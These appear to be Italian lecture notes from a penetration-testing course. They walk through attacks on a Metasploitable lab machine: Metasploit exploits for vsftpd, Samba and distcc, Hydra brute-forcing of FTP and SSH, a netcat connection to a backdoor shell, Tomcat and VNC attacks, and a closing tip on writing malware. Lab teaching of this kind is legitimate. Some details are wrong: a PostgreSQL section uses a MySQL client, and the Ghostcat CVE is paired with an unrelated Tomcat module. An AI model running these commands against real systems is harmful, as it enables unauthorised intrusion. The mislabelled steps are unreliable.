# Lezione 30 maggio
Dal vulnerability assessment fatto in precedenza ricaviamo le informazioni per effettuare il penetration testing

2 elementi del report VA di OpenVAS ci interessano maggiormente:
- sezione **risultati**, sono tutte le vulnerabilità trovate definite per nome
- sezione **CVEs**, sono tutte le vulnerabilità trovate *definite per codice*

Ogni vulnerabilità dovrebbe essere testata! (Partendo dalla più grave)

```bash
sudo nmap -sV -O -p1-1024 --script vulners 192.168.1.245
```

**NB**. Non è detto che tutte le vulnerabilità siano sfruttabili, per questo dobbiamo testarle durante il penetration testing

In questa dimostrazione sfrutteremo delle vulnerabilità sul servizio **vsftpd 2.3.4** esposto nella porta **21** della Metasploitable

Per testare le vulnerabilità utilizzeremo il **framework Metasploit**

##### Qual è la differenza tra Exploit e Payload?
**EXPLOIT** è la vulnerabilità che noi utilizziamo per entrare nel sistema
**PAYLOAD** è il codice effettivo per mandare in esecuzione l'exploit, **un exploit infatti può avere più payload** 

```bash
search vsftpd	# per cercare degli exploit
use exploit/unix/ftp/vsftpd_234_backdoor	# per usare l'exploit
show options	# per vedere le opzioni configurabili dell'exploit
set RHOST 192.168.1.245		# settiamo l'ip del target
exploit		# per lanciare l'exploit
```

A questo punto, se l'exploit è andato a buon fine, MSF **avrà aperto una sessione tra la nostra macchina e quella vittima**.

**NB**. Senza aprire file (che magari non ci è permesso da contratto) dovremmo dimostrare al cliente di essere entrati nella macchina, ad esempio con degli **screenshots**

**NB2**. È importante **documentare passo passo ciò che facciamo**!

<br>

#### Utente Anonimo
Un altra vulnerabilità che possiamo andare a sfruttare è la **CVE-1999-0497** che permette di collegersi con **utente anonimo** al servizio FTP
```bash
ftp 192.168.1.245
>>> user: anonymous
>>> psw: 
# Siamo dentro la macchina senza aver inserito delle credenziali 
```

<br>

#### FTP bruteforce - Hydra
Questo specifico servizio FTP è anche vulnerabile ad un **attacco bruteforce**. Per lanciare questo genere di attacco utilizziamo **hydra**

```bash	
hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 192.168.1.245 ftp -V

# Per questo attacco bruteforce utilizzeremo un wordlist per le password e una per gli utenti
```

In questo caso abbiamo trovato che la combinazione **user** - **user** ci permette di accedere al servizio FTP

<br>

#### SSH bruteforce
Utilizziamo lo stesso comando di prima, cambiando però il servizio che deve essere attaccato

```bash	
hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 192.168.1.245 ssh -V
```

Anche in questo caso abbiamo trovato che la combinazione **user** - **user** ci permette di entrare nel servizio SSH

<br>

#### SAMBA - CVE-2007-2447
Questa vulnerabilità permette un attacco di tipo **remote shell command execution**, proviamo a sfruttarla tramite MSF

**NB**. È importante avere sempre la versione più aggiornata di Metasploit

```bash
search CVE-2007-2447	# per cercare direttamente tramite CVE
use exploit/multi/samba/usermap_script
set RHOST 192.168.1.245
run		# lanciamo l'exploit
```

<br>

#### PostgreSQL weak password
Questa vulnerabilità permetterebbe di connetersi al database utilizzando l'**username root** e **password vuota**

```bash
mysql -u root -p -h 192.168.1.245   # per conneterci al DB come root
```

<br>

#### Backdoor Ingreslock
**NB**. **netcat** ci permette di aprire delle comunicazioni tra la macchina host e la vittima

```bash
nc 192.168.1.245 1524
```

Abbiamo ora una remote shell a nostra disposizione

<br>

#### DistCC Remote Code Execution - CVE-2004-2687
Permette di eseguire codice nella macchina da remoto

Per questo attacco utilizziamo **msfconsole** questa volta però **specificando un payload**.

```bash
search CVE-2004-2687
use unix/misc/distcc_exec
set RHOST 192.168.1.245
show payloads		# per mostrare i payload disponibili per questo exploit
set payload cmd/unix/bind_ruby		# per settare il payload
run
```

**NB**. I payload vengono scritti prevalentemente in **PERL**, **RUBY** o **PYTHON**

Questo ci mostra come spesso un exploit potrebbe non funzionare con il payload di default ma potrebbe invece avere successo con un altro payload

<br>

#### Apache Tomcat (Ghostcat) - CVE-2020-1938
In questo caso vediamo che ci sono più opzioni da configurare per utilizzare questo payload, e dobbiamo anche modificare la porta

```bash
use exploit/multi/http/tomcat_mgr_upload 
set RPORT 8180
set RHOST 192.168.1.245
set HttpPassword tomcat
set HttpUsername tomcat
show targets	# per mostrare i possibili target dell'exploit
set target 0
```

<br>

#### VNC brute force login
```bash
search VNC login
use auxiliary/scanner/vnc/vnc_login 
set RHOST 192.168.1.245
```

Proviamo a conneterci al servizio VNC tramite **vncviewer** inserendo la password **password** (trovata grazie l'exploit)

<br>

### Armitage
Questo programma permette di utilizzare metasploit tramite interfaccia grafica

<br>

**NB**. All'interno del codice di un malware **non bisogna mai importare librerie esterne** ma bisogna sempre **riscrivere il codice di quest'ultima**, poichè nel computer vittima potrebbe non essere possibile linkare dinamicamente altre librerie

*vedi screenshot malware prof su desktop*